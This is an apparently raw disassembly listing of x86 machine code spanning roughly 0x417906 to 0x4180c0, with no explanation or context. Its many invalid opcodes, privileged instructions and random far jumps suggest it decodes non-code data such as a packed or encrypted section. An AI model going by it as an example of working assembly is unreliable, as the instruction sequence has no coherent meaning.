  417906:	or     DWORD PTR [edx+0xdeadbd],ecx
  41790c:	aaa    
  41790d:	fdiv   QWORD PTR [ecx]
  41790f:	popf   
  417910:	adc    cl,BYTE PTR [edi-0x18]
  417913:	push   cs
  417914:	mov    bl,0x6e
  417916:	ins    BYTE PTR es:[edi],dx
  417917:	xlat   BYTE PTR ds:[ebx]
  417918:	pop    edi
  417919:	sbb    esi,0x2ddf75f8
  41791f:	out    dx,eax
  417920:	mov    eax,ds:0x841689af
  417925:	xor    ah,BYTE PTR [edi-0x1a]
  417928:	ret    0x994a
  41792b:	push   ecx
  41792c:	mov    ecx,0xcadec878
  417931:	pusha  
  417932:	sbb    BYTE PTR [esi],dh
  417934:	jg     0x4178fb
  417936:	dec    esi
  417937:	xor    esp,edi
  417939:	push   ebp
  41793a:	std    
  41793b:	jno    0x417975
  41793d:	mov    esi,DWORD PTR ds:0x7e4c6182
  417943:	ja     0x4178ca
  417945:	shr    DWORD PTR [edi-0x69024b2],0x2a
  41794c:	mov    BYTE PTR [eax+0x3831a846],ah
  417952:	(bad)  
  417953:	stos   DWORD PTR es:[edi],eax
  417954:	leave  
  417955:	push   edi
  417956:	mov    dh,0xf5
  417958:	(bad)  
  417959:	arpl   WORD PTR ds:0xbcbecb4f,sp
  41795f:	or     DWORD PTR [edi+0x4292a888],eax
  417965:	aam    0x4f
  417967:	aam    0x26
  417969:	imul   ebp,eax,0xe88df6d8
  41796f:	mov    ds:0xe768d0ed,eax
  417974:	cmp    eax,0xe940b1de
  417979:	inc    ebp
  41797a:	aam    0x27
  41797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41797d:	(bad)  ds:0x24f4b81
  417983:	dec    edx
  417984:	adc    eax,0xdf394689
  417989:	xchg   ecx,eax
  41798a:	pop    eax
  41798b:	stos   BYTE PTR es:[edi],al
  41798c:	push   eax
  41798d:	adc    esp,esp
  41798f:	sbb    dl,cl
  417991:	dec    esp
  417992:	mov    DWORD PTR [edx-0x53],esi
  417995:	dec    ebp
  417996:	cmp    ax,0x720e
  41799a:	lods   eax,DWORD PTR ds:[esi]
  41799b:	pop    esp
  41799c:	push   esp
  41799d:	adc    ch,ah
  41799f:	ficom  DWORD PTR [edx-0x1bd2c626]
  4179a5:	aas    
  4179a6:	mov    ebp,0xe02297ae
  4179ab:	fwait
  4179ac:	cli    
  4179ad:	mov    bl,0x27
  4179af:	mov    edi,0xb0230f21
  4179b4:	sbb    DWORD PTR [eax+0x1b39a415],esi
  4179ba:	icebp  
  4179bb:	xchg   ebx,eax
  4179bc:	dec    esp
  4179bd:	mov    bl,bh
  4179bf:	dec    eax
  4179c0:	push   ebp
  4179c1:	jb     0x417968
  4179c3:	adc    ebp,esp
  4179c5:	data16 sbb ax,0xd7ce
  4179ca:	sub    al,0x89
  4179cc:	push   ecx
  4179cd:	dec    ebp
  4179ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179cf:	add    DWORD PTR [edx],ebx
  4179d1:	xchg   esp,eax
  4179d2:	mov    cl,0x5e
  4179d4:	mov    ebx,0x3b9e13c2
  4179d9:	mov    esp,0x7dcdebf3
  4179de:	dec    ecx
  4179df:	inc    edi
  4179e0:	sbb    ah,BYTE PTR ds:0x72b5817c
  4179e6:	adc    BYTE PTR [edi-0x2c],bh
  4179e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179ea:	mov    esp,0x50b6f1cf
  4179ef:	pop    ebx
  4179f0:	or     ebp,DWORD PTR [ebx]
  4179f2:	and    BYTE PTR [ebx+0x7f],ah
  4179f5:	add    eax,DWORD PTR ds:0xbd55f396
  4179fb:	ret    0x51b5
  4179fe:	sbb    DWORD PTR [edx+edx*8+0x10d71e34],0x7c3bc5e7
  417a09:	out    0xc6,eax
  417a0b:	lods   eax,DWORD PTR ds:[esi]
  417a0c:	jne    0x4179d5
  417a0e:	mov    al,0xa6
  417a10:	ins    DWORD PTR es:[edi],dx
  417a11:	shl    BYTE PTR [ebp+0x3c],0x47
  417a15:	mov    eax,0xf3a38148
  417a1a:	inc    ecx
  417a1b:	aas    
  417a1c:	and    al,0x5f
  417a1e:	sub    BYTE PTR ds:0x72b12c18,0xa4
  417a25:	xor    al,0x88
  417a27:	or     ecx,edx
  417a29:	mov    esp,0x2e42e392
  417a2e:	shl    BYTE PTR [eax+0x1b],0x1a
  417a32:	sub    ch,al
  417a34:	mov    ebx,0x82fa6abf
  417a39:	sub    al,0xbc
  417a3b:	xchg   esp,eax
  417a3c:	les    edx,FWORD PTR [esi+0x2429848f]
  417a42:	pop    ebx
  417a43:	mov    bh,0x5f
  417a45:	mov    al,ds:0x89dcab2a
  417a4a:	inc    BYTE PTR [ebx+0x238fefb0]
  417a50:	push   0x27328b9a
  417a55:	outs   dx,BYTE PTR ds:[esi]
  417a56:	mov    ch,0x8c
  417a58:	xchg   sp,ax
  417a5a:	aaa    
  417a5b:	pop    edi
  417a5c:	mov    edx,0x4c92b282
  417a61:	out    dx,al
  417a62:	lods   al,BYTE PTR ds:[esi]
  417a63:	mov    ah,0x91
  417a65:	xchg   esi,eax
  417a66:	lods   al,BYTE PTR ds:[esi]
  417a67:	jns    0x417a56
  417a69:	ins    DWORD PTR es:[edi],dx
  417a6a:	cdq    
  417a6b:	aaa    
  417a6c:	mov    edi,0x689a60ea
  417a71:	xor    al,BYTE PTR [ecx+0x3ee597a0]
  417a77:	cmp    BYTE PTR [edx+eiz*2+0x226f03b7],al
  417a7e:	call   0xd793:0xcf2a05a9
  417a85:	mov    ds:0xa6ca8fe7,eax
  417a8a:	mov    DWORD PTR [edi+0x7c],0xaee00b08
  417a91:	sbb    bl,BYTE PTR [ecx+edi*2]
  417a94:	add    edx,DWORD PTR [esi+0x6ba45fd5]
  417a9a:	pop    es
  417a9b:	scas   al,BYTE PTR es:[edi]
  417a9c:	xchg   ah,al
  417a9e:	pop    ebx
  417a9f:	into   
  417aa0:	fsubr  st,st(7)
  417aa2:	mov    ss,WORD PTR [esi-0x13]
  417aa5:	push   cs
  417aa6:	inc    ebx
  417aa7:	ds dec ebx
  417aa9:	mov    ebx,0x1f1065fc
  417aae:	pop    edi
  417aaf:	push   es
  417ab0:	clc    
  417ab1:	xchg   edx,eax
  417ab2:	(bad)  
  417ab3:	sub    bh,BYTE PTR [ecx*4+0x13159562]
  417aba:	(bad)  
  417abb:	fstp   DWORD PTR [edi+edi*8-0x1e]
  417abf:	je     0x417af3
  417ac1:	jg     0x417ac9
  417ac3:	arpl   WORD PTR [eax],dx
  417ac5:	adc    ebx,DWORD PTR [edx+0x566fcd3]
  417acb:	jmp    FWORD PTR [esi+0x64c8e88c]
  417ad1:	ror    BYTE PTR [ecx+0x5bcb8e8f],0x29
  417ad8:	cmp    al,0xda
  417ada:	sub    esp,DWORD PTR [eax]
  417adc:	mov    dh,0xe8
  417ade:	(bad)  
  417adf:	jecxz  0x417af6
  417ae1:	xchg   esp,eax
  417ae2:	mov    ebx,0x8a625a08
  417ae7:	sbb    eax,0xa4ae75f9
  417aec:	inc    esi
  417aed:	cmp    DWORD PTR [ecx],esp
  417aef:	fwait
  417af0:	or     ah,bl
  417af2:	test   BYTE PTR [ebp-0x2e8c5fed],dl
  417af8:	mov    esp,0x93f1dee9
  417afd:	fistp  QWORD PTR [ecx+0x36]
  417b00:	std    
  417b01:	dec    eax
  417b02:	jo     0x417ad2
  417b04:	cmp    eax,esp
  417b06:	jg     0x417ad5
  417b08:	xchg   ecx,eax
  417b09:	fnop   
  417b0b:	mov    ds,WORD PTR [ebx-0x2765434a]
  417b11:	mov    dh,0x11
  417b13:	inc    ebp
  417b14:	shl    bh,0x9f
  417b17:	aad    0xd5
  417b19:	or     cl,ch
  417b1b:	ins    DWORD PTR es:[edi],dx
  417b1c:	mov    ah,0xf6
  417b1e:	cmp    ch,dh
  417b20:	jb     0x417b94
  417b22:	pop    esp
  417b23:	adc    edi,ecx
  417b25:	jge    0x417b2c
  417b27:	loopne 0x417aec
  417b29:	(bad)  
  417b2a:	out    dx,al
  417b2b:	fcmove st,st(4)
  417b2d:	mov    al,ds:0xd9b7913a
  417b32:	and    eax,DWORD PTR [di]
  417b35:	and    bh,BYTE PTR ds:0x1ef9b8cf
  417b3b:	sbb    eax,0x64c39f42
  417b40:	icebp  
  417b41:	mov    esi,0x7764aaa0
  417b46:	sahf   
  417b47:	repnz sub dh,BYTE PTR [eax]
  417b4a:	add    DWORD PTR [edi],eax
  417b4c:	cmp    ecx,eax
  417b4e:	pop    esp
  417b4f:	sub    BYTE PTR [edi+0x17],0x20
  417b53:	outs   dx,DWORD PTR ds:[esi]
  417b54:	cdq    
  417b55:	cld    
  417b56:	xor    ah,BYTE PTR [eax]
  417b58:	pop    ss
  417b59:	inc    edi
  417b5a:	mov    WORD PTR [ebx],es
  417b5c:	dec    eax
  417b5d:	adc    dh,BYTE PTR [ecx]
  417b5f:	pop    ebx
  417b60:	fld    TBYTE PTR [edi]
  417b62:	cmp    esp,DWORD PTR [eax]
  417b64:	es pop ds
  417b66:	pusha  
  417b67:	dec    esp
  417b68:	sub    ecx,ebx
  417b6a:	xor    DWORD PTR [edi+0x63],edx
  417b6d:	addr16 int 0x70
  417b70:	ficomp DWORD PTR [ebx]
  417b72:	push   esp
  417b73:	inc    ebx
  417b74:	cld    
  417b75:	push   0x6aa2b647
  417b7a:	pop    ss
  417b7b:	jp     0x417b6d
  417b7d:	lods   eax,DWORD PTR ds:[esi]
  417b7e:	(bad)  
  417b7f:	push   cs
  417b80:	cmp    al,0x69
  417b82:	mov    bl,0x55
  417b84:	lea    esi,ds:0x8c2ebf53
  417b8a:	jmp    0x6aeb1d05
  417b8f:	div    BYTE PTR [eax+0x22368b7c]
  417b95:	jecxz  0x417b9e
  417b97:	adc    ch,cl
  417b99:	stc    
  417b9a:	jge    0x417b62
  417b9c:	rcr    ecx,0xa1
  417b9f:	cmp    dh,BYTE PTR [ebx+eiz*4-0x37]
  417ba3:	dec    ecx
  417ba4:	xchg   ebp,eax
  417ba5:	sbb    eax,0x890e5535
  417baa:	cld    
  417bab:	push   ebx
  417bac:	fnsave [edx+0x13]
  417baf:	dec    ebx
  417bb0:	jmp    0x87e3:0xecf1e295
  417bb7:	inc    ebp
  417bb8:	(bad)  
  417bb9:	sbb    al,0x8
  417bbb:	retf   
  417bbc:	push   ds
  417bbd:	repz push ebx
  417bbf:	cdq    
  417bc0:	cmp    al,0xa5
  417bc2:	mov    al,ds:0xfe0489e5
  417bc7:	mov    edi,?
  417bc9:	mov    eax,ds:0x7785d9
  417bce:	mov    eax,ds:0xceabc2d4
  417bd3:	pop    esi
  417bd4:	imul   DWORD PTR ds:0xa109cfd2
  417bda:	test   eax,0xb2d7df17
  417bdf:	jmp    0x53a5:0xaf9caa58
  417be6:	xchg   edx,eax
  417be7:	repnz ror DWORD PTR [edx+0x6817dafb],1
  417bee:	test   BYTE PTR [ecx+0x19],ch
  417bf1:	fs call 0x225568f5
  417bf7:	repnz mov eax,0x124846f7
  417bfd:	ret    0x154e
  417c00:	retf   0x499f
  417c03:	pop    esi
  417c04:	pop    ds
  417c05:	stos   BYTE PTR es:[edi],al
  417c06:	ins    DWORD PTR es:[edi],dx
  417c07:	lods   eax,DWORD PTR ds:[esi]
  417c08:	dec    esp
  417c09:	fadd   QWORD PTR [eax-0x4c]
  417c0c:	out    dx,eax
  417c0d:	inc    edx
  417c0e:	loopne 0x417bf7
  417c10:	mov    bh,0x15
  417c12:	mov    DWORD PTR [eax],eax
  417c14:	sbb    DWORD PTR [ebp+0x35],eax
  417c17:	sub    DWORD PTR [ebp+0x6ba6ab99],0xffffffb6
  417c1e:	mov    eax,0x261f6000
  417c23:	or     ebp,0xffffff9f
  417c26:	xchg   BYTE PTR [bp+si-0x52],bl
  417c2a:	aas    
  417c2b:	xor    eax,0x6924da8d
  417c30:	iret   
  417c31:	inc    ebp
  417c32:	ret    
  417c33:	ins    BYTE PTR es:[edi],dx
  417c34:	pop    ebx
  417c35:	push   esi
  417c36:	mov    gs,WORD PTR [ebx-0x1c]
  417c39:	int    0x39
  417c3b:	adc    eax,0xa5c470a1
  417c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c41:	or     esp,DWORD PTR [ebp+0x2d874da1]
  417c47:	scas   eax,DWORD PTR es:[edi]
  417c48:	push   ebp
  417c49:	aaa    
  417c4a:	cmp    DWORD PTR [ebp-0x56ddbb4a],eax
  417c50:	xchg   ecx,eax
  417c51:	jno    0x417be6
  417c53:	xchg   edi,eax
  417c54:	ror    BYTE PTR [edx],0xd
  417c57:	in     al,dx
  417c58:	aad    0xb
  417c5a:	sub    ebp,DWORD PTR [ebx]
  417c5c:	call   0xe2642e37
  417c61:	in     al,0xa
  417c63:	jne    0x417c91
  417c65:	and    ah,BYTE PTR [ebx+0x24]
  417c68:	jge    0x417bf1
  417c6a:	lahf   
  417c6b:	pop    eax
  417c6c:	push   esp
  417c6d:	data16 mov ah,0xeb
  417c70:	sub    al,0xe3
  417c72:	sti    
  417c73:	out    dx,al
  417c74:	push   0xffffff8d
  417c76:	ss aaa 
  417c78:	add    al,0x8
  417c7a:	rol    ebx,1
  417c7c:	lahf   
  417c7d:	fsub   QWORD PTR [ebp+edi*8-0x33]
  417c81:	jp     0x417cce
  417c83:	stos   BYTE PTR es:[edi],al
  417c84:	xor    BYTE PTR ds:0xc9e2ffb0,al
  417c8a:	pop    ebp
  417c8b:	cmp    cl,BYTE PTR cs:[edx]
  417c8e:	or     DWORD PTR [esi+0x5f],ebx
  417c91:	pusha  
  417c92:	(bad)  
  417c94:	cmp    DWORD PTR [ebx-0x34387666],esp
  417c9a:	mov    WORD PTR [ebx+0x2ef39032],es
  417ca0:	jne    0x417c2c
  417ca2:	inc    edx
  417ca3:	cmp    ebx,DWORD PTR [edi-0x7d]
  417ca6:	push   ebx
  417ca7:	sub    ebx,ebp
  417ca9:	rcl    BYTE PTR ds:0x1f8ee45,0x21
  417cb0:	xor    BYTE PTR [esi+eax*1-0x6b],0x4c
  417cb5:	(bad)  
  417cb6:	jmp    DWORD PTR [esi+0x34450a9c]
  417cbc:	add    DWORD PTR [ebp-0x14313538],edi
  417cc2:	cmc    
  417cc3:	jecxz  0x417ceb
  417cc5:	push   ebp
  417cc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cc7:	xchg   ecx,eax
  417cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cc9:	into   
  417cca:	shl    DWORD PTR [ebx+ecx*1+0x62],cl
  417cce:	in     eax,0x24
  417cd0:	aad    0xf6
  417cd2:	cmp    ch,dl
  417cd4:	pop    ecx
  417cd5:	in     al,dx
  417cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cd7:	rol    DWORD PTR [bp+0xe],cl
  417cdb:	or     eax,0x36293d14
  417ce0:	and    ebp,DWORD PTR [edi]
  417ce2:	les    edi,FWORD PTR [edi+0x128f7c0]
  417ce8:	push   ebp
  417ce9:	stos   DWORD PTR es:[edi],eax
  417cea:	xchg   BYTE PTR [edi+0x5fe2bf90],ah
  417cf0:	pop    esp
  417cf1:	loopne 0x417cb0
  417cf3:	jmp    0x8e89053c
  417cf8:	cld    
  417cf9:	pop    ebp
  417cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cfb:	mov    dl,0x20
  417cfd:	xchg   ecx,eax
  417cfe:	test   BYTE PTR [edi],dl
  417d00:	cmp    DWORD PTR [ecx],ebx
  417d02:	push   0x9f5b7fef
  417d07:	xchg   BYTE PTR [edx+0x55ff4d6e],al
  417d0d:	aaa    
  417d0e:	mov    WORD PTR [edi-0x50874bcb],es
  417d14:	jno    0x417d3b
  417d16:	adc    cl,BYTE PTR [ecx+0x155442d2]
  417d1c:	xor    ebx,DWORD PTR [esi]
  417d1e:	clc    
  417d1f:	mov    ah,0x27
  417d21:	mov    eax,0x82234c1
  417d26:	retf   
  417d27:	das    
  417d28:	jns    0x417d24
  417d2a:	mov    ebx,0x67d924
  417d2f:	dec    edx
  417d30:	and    ebx,edi
  417d32:	push   ds
  417d33:	loop   0x417d3d
  417d35:	in     eax,dx
  417d36:	or     DWORD PTR [edx-0x50],0xffffff82
  417d3a:	dec    ebx
  417d3b:	xor    BYTE PTR [ecx+ebp*4+0x73],bl
  417d3f:	icebp  
  417d40:	cli    
  417d41:	jg     0x417d2e
  417d43:	sbb    bl,BYTE PTR [esi+0x131da57b]
  417d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d4a:	jbe    0x417ce4
  417d4c:	cmp    DWORD PTR cs:[eax-0x1609c46d],edx
  417d53:	push   es
  417d54:	add    eax,DWORD PTR [ebx+0x7]
  417d57:	ds or  al,ch
  417d5a:	shr    BYTE PTR [ebx],1
  417d5c:	xchg   ecx,eax
  417d5d:	add    ax,0x39b8
  417d61:	mov    ebx,0xe17eea69
  417d66:	or     ebp,DWORD PTR [edi+0xc7a2d50]
  417d6c:	loop   0x417ddc
  417d6e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  417d70:	cld    
  417d71:	imul   ebx,edi,0x19
  417d74:	stos   BYTE PTR es:[edi],al
  417d75:	ffreep st(7)
  417d77:	fld    DWORD PTR [esi+0x10]
  417d7a:	pop    edi
  417d7b:	adc    eax,0xff75272c
  417d80:	inc    esi
  417d81:	enter  0x4061,0x9e
  417d85:	inc    ecx
  417d86:	test   BYTE PTR [edi-0x5f],cl
  417d89:	adc    eax,esi
  417d8b:	xor    dh,bh
  417d8d:	push   eax
  417d8e:	lock repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d91:	js     0x417dee
  417d93:	ja     0x417d79
  417d95:	fisttp WORD PTR [edx+0x37]
  417d98:	or     BYTE PTR [edx-0x4881bbf8],0x8
  417d9f:	pop    ebx
  417da0:	push   ss
  417da1:	(bad)  
  417da3:	jmp    0x417d4a
  417da5:	pop    edi
  417da6:	daa    
  417da7:	sub    eax,0x580edf9c
  417dac:	jae    0x417e20
  417dae:	in     al,dx
  417daf:	inc    ecx
  417db0:	or     al,0xf3
  417db2:	or     DWORD PTR [eax-0x54f870d7],edx
  417db8:	sbb    al,bh
  417dba:	cmp    BYTE PTR [ebp-0x7cdef825],dh
  417dc0:	sbb    esp,DWORD PTR [esi-0x3930e7bb]
  417dc6:	push   ebx
  417dc7:	xchg   ebp,eax
  417dc8:	fidivr DWORD PTR [ebx]
  417dca:	mov    al,0x16
  417dcc:	iret   
  417dcd:	aam    0xbf
  417dcf:	cvtps2pd xmm6,xmm6
  417dd2:	dec    esp
  417dd3:	jp     0x417de4
  417dd5:	ror    DWORD PTR [eax*2+0x2da837bb],0xbf
  417ddd:	cwde   
  417dde:	push   esp
  417ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de0:	pop    esp
  417de1:	cmp    BYTE PTR [esi-0x35b491d5],0x52
  417de8:	fdivr  QWORD PTR [ebx+0x46]
  417deb:	call   0xe58e:0xabfe7b42
  417df2:	push   esi
  417df3:	test   al,0x24
  417df5:	das    
  417df6:	xor    al,0x9a
  417df8:	jno    0x417e4b
  417dfa:	sbb    edx,DWORD PTR [ebx+0x19]
  417dfd:	in     al,dx
  417dfe:	xor    BYTE PTR ds:0x168b7393,al
  417e04:	pop    es
  417e05:	or     esp,DWORD PTR [edi-0x39]
  417e08:	cmp    edi,DWORD PTR [edi]
  417e0a:	xchg   DWORD PTR [edi+esi*2-0x1485a67a],esp
  417e11:	push   0x58
  417e13:	jl     0x417e0a
  417e15:	push   0xffffffda
  417e17:	xchg   ebx,eax
  417e18:	push   edi
  417e19:	(bad)  
  417e1a:	call   FWORD PTR [ecx+0x16d2a4c8]
  417e20:	inc    edx
  417e21:	pop    ds
  417e22:	sub    al,0x8f
  417e24:	ja     0x417e00
  417e26:	and    edi,eax
  417e28:	in     eax,dx
  417e29:	jne    0x417e60
  417e2b:	add    eax,0xcbc3e3e5
  417e30:	loopne 0x417e9c
  417e32:	cli    
  417e33:	sbb    dh,BYTE PTR [edx]
  417e35:	out    0xbb,eax
  417e37:	push   edx
  417e38:	adc    eax,DWORD PTR [edi]
  417e3a:	pop    esp
  417e3b:	ss int3 
  417e3d:	cli    
  417e3e:	es daa 
  417e40:	std    
  417e41:	(bad)  
  417e42:	outs   dx,BYTE PTR ds:[esi]
  417e43:	mov    WORD PTR [edi+0x36002e48],ss
  417e49:	inc    edi
  417e4a:	pushf  
  417e4b:	jmp    0x52895646
  417e50:	fild   QWORD PTR [eax+0x8cf784d]
  417e56:	(bad)  
  417e57:	mov    edi,0xd6d52ef3
  417e5c:	dec    esp
  417e5d:	cmp    DWORD PTR [ecx],ebx
  417e5f:	cmp    dl,dl
  417e61:	(bad)  
  417e62:	sbb    ch,bl
  417e64:	xlat   BYTE PTR ds:[ebx]
  417e65:	inc    ebp
  417e66:	pop    ebx
  417e67:	inc    esp
  417e68:	out    dx,al
  417e69:	repnz adc ebx,esp
  417e6c:	jbe    0x417ec0
  417e6e:	sub    eax,0xb09348b4
  417e73:	gs mov eax,es:0xddf36c51
  417e7a:	and    dl,cl
  417e7c:	outs   dx,DWORD PTR ds:[esi]
  417e7d:	adc    DWORD PTR ds:0x93f10a49,edx
  417e83:	sahf   
  417e84:	pop    ss
  417e85:	std    
  417e86:	xchg   edx,eax
  417e87:	xchg   edx,eax
  417e88:	scas   eax,DWORD PTR es:[edi]
  417e89:	int3   
  417e8a:	aas    
  417e8b:	inc    edx
  417e8c:	push   esi
  417e8d:	arpl   WORD PTR [esi+0x16],di
  417e90:	outs   dx,BYTE PTR ds:[esi]
  417e91:	adc    al,0x5c
  417e93:	add    esp,esp
  417e95:	xchg   esp,eax
  417e96:	xor    bh,ah
  417e98:	xchg   DWORD PTR [ecx-0x6e0ca63d],ebx
  417e9e:	xchg   esi,eax
  417e9f:	mov    eax,ds:0x976937c8
  417ea4:	inc    eax
  417ea5:	pop    ecx
  417ea6:	daa    
  417ea7:	(bad)  
  417ea8:	cwde   
  417ea9:	mov    edi,DWORD PTR [edi+esi*4]
  417eac:	imul   esi,edx,0x75
  417eaf:	ins    DWORD PTR es:[edi],dx
  417eb0:	int3   
  417eb1:	push   0x2a513ac9
  417eb6:	jmp    0x417e44
  417eb8:	popf   
  417eb9:	xchg   esp,eax
  417eba:	jge    0x417f22
  417ebc:	or     dl,BYTE PTR [edx-0x29]
  417ebf:	add    al,0x49
  417ec1:	inc    eax
  417ec2:	add    eax,0xf92a36f4
  417ec7:	cmp    al,0x83
  417ec9:	ss jo  0x417eab
  417ecc:	add    al,0xd1
  417ece:	sub    al,0xc5
  417ed0:	(bad)
  417ed3:	loop   0x417ee3
  417ed5:	xor    eax,0x965b7da9
  417eda:	inc    BYTE PTR [ebx+ebx*2]
  417edd:	out    0xff,al
  417edf:	add    esi,DWORD PTR ds:0x144dc2e8
  417ee5:	cli    
  417ee6:	fimul  WORD PTR [edi-0xd423ab5]
  417eec:	sahf   
  417eed:	ficomp WORD PTR [edi+0x50d7a2bc]
  417ef3:	mov    edi,0x70116a3
  417ef8:	(bad)  
  417ef9:	mov    bh,0xd
  417efb:	outs   dx,BYTE PTR ds:[esi]
  417efc:	mov    BYTE PTR [eax],dh
  417efe:	(bad)  
  417eff:	mov    esi,0x8eb62140
  417f04:	push   0x791180b6
  417f09:	sub    esp,edi
  417f0b:	mov    edi,0x543f0cd8
  417f10:	cs mov edi,0x47ee6fff
  417f16:	add    ch,BYTE PTR ds:0xdde6a62b
  417f1c:	sbb    eax,0xb9310064
  417f21:	pop    ds
  417f22:	jmp    edi
  417f24:	cwde   
  417f25:	inc    ebp
  417f26:	dec    eax
  417f27:	(bad)  
  417f28:	repnz shr BYTE PTR [eax+0x2e],1
  417f2c:	push   edx
  417f2d:	adc    DWORD PTR [ebp+0x6fd4502e],0x375fa7c7
  417f37:	xor    eax,DWORD PTR [esi-0x42]
  417f3a:	dec    esi
  417f3c:	push   0x2e022237
  417f41:	les    ebp,FWORD PTR [ebx]
  417f43:	in     al,0x80
  417f45:	scas   al,BYTE PTR es:[edi]
  417f46:	xor    esp,DWORD PTR [edi+0x593905a3]
  417f4c:	shl    DWORD PTR [eax],0x82
  417f4f:	imul   edx,DWORD PTR [eax+ecx*2],0x36c70601
  417f56:	pop    ss
  417f57:	outs   dx,BYTE PTR ds:[esi]
  417f58:	bound  si,DWORD PTR [esi-0x7a]
  417f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f5d:	fucomip st,st(0)
  417f5f:	aam    0x9b
  417f61:	in     al,dx
  417f62:	into   
  417f63:	add    bl,dl
  417f65:	cmc    
  417f66:	int3   
  417f67:	mov    bh,0x9f
  417f69:	enter  0xb9d8,0x2a
  417f6d:	int3   
  417f6e:	fs movs DWORD PTR es:[edi],DWORD PTR gs:[esi]
  417f71:	(bad)  
  417f72:	mov    ?,WORD PTR [ecx]
  417f74:	nop
  417f75:	loop   0x417f7c
  417f77:	push   cs
  417f78:	pop    ss
  417f79:	repz test al,0xea
  417f7c:	scas   al,BYTE PTR es:[edi]
  417f7d:	test   al,0xac
  417f7f:	sahf   
  417f80:	outs   dx,BYTE PTR ds:[esi]
  417f81:	mov    al,ch
  417f83:	fucomip st,st(5)
  417f85:	xchg   BYTE PTR [eax-0x6d],cl
  417f88:	test   BYTE PTR [eax-0x3d1c388c],ah
  417f8e:	lods   eax,DWORD PTR ds:[esi]
  417f8f:	xchg   ecx,esi
  417f91:	ret    0xcecf
  417f94:	out    dx,al
  417f95:	adc    al,0x33
  417f97:	aam    0x8
  417f99:	test   al,0x92
  417f9b:	sub    ecx,0x40
  417f9e:	adc    al,0x7f
  417fa0:	jo     0x418015
  417fa2:	xchg   esi,eax
  417fa3:	push   es
  417fa4:	xor    DWORD PTR [esi+0x46],ebx
  417fa7:	inc    esp
  417fa8:	adc    eax,0xef4843fe
  417fad:	push   es
  417fae:	add    bl,BYTE PTR [esi+ebx*1]
  417fb1:	rcl    BYTE PTR [edi+0x5e],cl
  417fb4:	push   ebx
  417fb5:	xor    eax,DWORD PTR [edx+0x341fe7b]
  417fbb:	and    ecx,edi
  417fbd:	pop    ebp
  417fbe:	fcmovb st,st(6)
  417fc0:	push   0xe85e93bf
  417fc5:	adc    DWORD PTR [ebx],ebx
  417fc7:	pop    edx
  417fc8:	idiv   BYTE PTR [edx+0x37]
  417fcb:	xchg   ecx,eax
  417fcc:	pop    esi
  417fcd:	(bad)  
  417fce:	xchg   esi,eax
  417fcf:	fs scas eax,DWORD PTR es:[edi]
  417fd1:	sbb    bh,dh
  417fd3:	ss int3 
  417fd5:	mov    dh,0xbf
  417fd7:	(bad)  
  417fd8:	or     DWORD PTR [esi],0xf4e88b12
  417fde:	and    BYTE PTR [esi],dh
  417fe0:	ins    DWORD PTR es:[edi],dx
  417fe1:	sbb    ecx,DWORD PTR [ebp+0x17]
  417fe4:	call   0x99f3:0x86f33b2b
  417feb:	mov    ch,0x87
  417fed:	sti    
  417fee:	inc    edx
  417fef:	mov    eax,ds:0xc7769795
  417ff4:	or     esi,DWORD PTR [eax+esi*1+0x6a]
  417ff8:	dec    ebp
  417ff9:	jmp    0x4f51:0xd695e1e
  418000:	lahf   
  418001:	xchg   edi,eax
  418002:	(bad)  
  418003:	and    esp,DWORD PTR [ecx-0x70]
  418006:	adc    bh,BYTE PTR [edi-0x42da3412]
  41800c:	cmp    BYTE PTR [ecx+0x17e53a41],dh
  418012:	mov    ss,WORD PTR [ebx]
  418014:	mov    ah,0xc8
  418016:	imul   edx,edi,0xffffffc8
  418019:	and    DWORD PTR [edx],0x75d01949
  41801f:	call   0x76a0:0x4cb77ee5
  418026:	pop    edi
  418027:	jb     0x417ff1
  418029:	or     esp,0x4e52ad2f
  41802f:	add    bl,al
  418031:	mov    ebx,DWORD PTR [esi]
  418033:	retf   
  418034:	or     BYTE PTR es:[edi-0x539dc39],ah
  41803b:	mov    ch,0x72
  41803d:	mov    bh,0xa9
  41803f:	and    dx,WORD PTR [ebp-0x292b435c]
  418046:	lods   eax,DWORD PTR ds:[esi]
  418047:	lds    eax,FWORD PTR [edi-0x5a16162e]
  41804d:	add    eax,0x3862eb5b
  418052:	mov    WORD PTR [ebx+0x47],?
  418055:	xchg   al,cl
  418057:	mov    eax,0x1d45f41d
  41805c:	(bad)  
  41805d:	cmc    
  41805e:	stos   BYTE PTR es:[edi],al
  41805f:	call   0xd702:0xad3e2b40
  418066:	push   ebx
  418067:	add    eax,0x3db8dc4b
  41806c:	sub    eax,0x9295569e
  418071:	add    BYTE PTR [esi+0x72184691],bh
  418077:	jp     0x418048
  418079:	fst    QWORD PTR [edx-0x58f58a04]
  41807f:	push   edx
  418080:	mov    cs,WORD PTR [eax]
  418082:	mov    ch,0x7f
  418084:	xchg   esp,eax
  418085:	shl    DWORD PTR [ebp-0x67a04c8e],0x0
  41808c:	mov    edi,edx
  41808e:	dec    ecx
  41808f:	rol    BYTE PTR [edx],cl
  418091:	jle    0x41804e
  418093:	nop
  418094:	mov    dl,BYTE PTR [edi+0x7e01a31b]
  41809a:	fisub  DWORD PTR [ebp-0x487f4ac6]
  4180a0:	jae    0x4180ca
  4180a2:	and    esp,ebp
  4180a4:	ret    0x696b
  4180a7:	arpl   WORD PTR [edi+0x3c5bf587],di
  4180ad:	in     eax,dx
  4180ae:	sub    ah,BYTE PTR [esi]
  4180b0:	ja     0x41810b
  4180b2:	and    dl,cl
  4180b4:	xchg   esi,eax
  4180b5:	std    
  4180b6:	push   ecx
  4180b7:	lock mov ecx,0xc5846446
  4180bd:	test   BYTE PTR cs:[esi],cl
  4180c0:	mov    ds:0x67cc4f21,eax
